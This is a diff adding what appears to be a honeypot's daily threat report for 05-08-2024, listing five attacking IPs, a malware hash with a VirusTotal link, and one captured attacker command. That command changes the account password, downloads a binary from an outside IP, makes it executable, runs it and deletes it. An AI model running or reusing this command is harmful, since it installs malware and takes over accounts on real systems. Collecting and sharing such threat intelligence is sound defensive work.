@@ -1,0 +1,20 @@
+Top 5 IPs for 05-08-2024 :
+
+115.73.212.35
+14.241.244.33
+49.88.156.34
+194.50.16.221
+113.108.88.121
+
+
+Malware Observed:
+
+File name : sshd
+6f1722190675208838ed9e9dee96de7eb4e2ada7a70cfdee759e81088fa82a95
+https://www.virustotal.com/gui/file/6f1722190675208838ed9e9dee96de7eb4e2ada7a70cfdee759e81088fa82a95
+
+
+
+Commands/exploits observed:
+
+lscpu | grep "CPU(s):                " && echo -e "wVVEsaRGa5nv\\nwVVEsaRGa5nv" | passwd && cd /tmp; wget http://194.50.16.26/bins/bin.x86_64; curl -s -O http://194.50.16.26/bins/bin.x86_64; chmod 777 bin.x86_64; ./bin.x86_64 x86hh; rm -rf **bin**
